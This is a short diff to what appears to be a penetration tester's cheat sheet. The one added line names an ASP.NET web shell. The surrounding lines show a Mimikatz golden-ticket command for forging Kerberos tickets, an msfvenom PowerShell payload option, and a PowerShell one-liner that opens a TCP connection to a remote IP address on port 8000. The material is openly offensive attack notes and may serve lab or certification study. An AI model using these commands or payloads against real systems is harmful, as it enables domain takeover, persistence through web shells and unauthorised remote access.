@@ -963,6 +963,8 @@ kerberos::golden /user:pete /domain:<domain_name> /sid:<domain_SID> /krbtgt:<krb
 
 msfvenom -f psh-reflection
 
+sharpy asp.net shell
+
 ping powershell
 
 $client = New-Object System.Net.Sockets.TcpClient; $client.Connect("192.168.45.179", 8000); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.Write("a"); $writer.Flush(); $writer.Close(); $client.Close()
